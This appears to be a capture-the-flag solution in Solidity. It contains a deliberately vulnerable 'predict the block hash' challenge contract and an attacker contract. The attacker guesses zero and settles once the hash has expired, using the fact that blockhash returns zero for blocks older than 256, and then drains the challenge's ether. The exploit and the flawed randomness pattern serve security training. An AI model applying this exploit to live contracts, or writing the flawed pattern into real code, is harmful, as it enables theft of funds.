pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheBlockHashChallengeAttacker {

    PredictTheBlockHashChallenge target;
    address owner;
    uint256 lockBlockNumber;

    function PredictTheBlockHashChallengeAttacker(address _target) public payable {
        require(msg.value == 1 ether);

        owner = msg.sender;
        target = PredictTheBlockHashChallenge(_target);
        lockBlockNumber = block.number + 1;

        target.lockInGuess.value(1 ether)(bytes32(0));
    }

    function tryAttack() public {
        bytes32 answer = block.blockhash(lockBlockNumber);
        require(answer == bytes32(0));

        target.settle();

        require(target.isComplete());
    }

    function withdraw() public {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }

    function() public payable {}
}